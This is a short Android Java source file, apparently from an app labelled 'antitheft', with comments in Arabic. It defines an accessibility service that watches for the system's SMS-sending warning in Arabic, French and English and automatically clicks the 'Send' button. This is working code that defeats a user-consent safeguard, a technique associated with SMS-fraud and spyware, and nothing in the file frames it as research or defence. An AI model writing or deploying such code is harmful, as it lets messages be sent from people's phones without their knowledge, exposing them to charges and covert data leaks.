package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AutoConfirmService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        // 1. البحث عن نص تحذير إرسال الرسالة (عربي / فرنسي / إنجليزي)
        List<AccessibilityNodeInfo> dialogTexts = rootNode.findAccessibilityNodeInfosByText("سيرسل رسالة SMS");
        
        if (dialogTexts == null || dialogTexts.isEmpty()) {
            dialogTexts = rootNode.findAccessibilityNodeInfosByText("enverra un SMS");
        }
        if (dialogTexts == null || dialogTexts.isEmpty()) {
            dialogTexts = rootNode.findAccessibilityNodeInfosByText("envoyer un SMS");
        }
        if (dialogTexts == null || dialogTexts.isEmpty()) {
            dialogTexts = rootNode.findAccessibilityNodeInfosByText("send an SMS");
        }

        // 2. إذا ظهرت النافذة التحذيرية، ابحث عن زر الإرسال واضغط عليه فوراً
        if (dialogTexts != null && !dialogTexts.isEmpty()) {
            List<AccessibilityNodeInfo> sendButtons = rootNode.findAccessibilityNodeInfosByText("إرسال");
            
            if (sendButtons == null || sendButtons.isEmpty()) {
                sendButtons = rootNode.findAccessibilityNodeInfosByText("Envoyer");
            }
            if (sendButtons == null || sendButtons.isEmpty()) {
                sendButtons = rootNode.findAccessibilityNodeInfosByText("Send");
            }

            if (sendButtons != null && !sendButtons.isEmpty()) {
                for (AccessibilityNodeInfo node : sendButtons) {
                    if (node.isClickable()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        break;
                    } else if (node.getParent() != null && node.getParent().isClickable()) {
                        node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        break;
                    }
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
    }
}
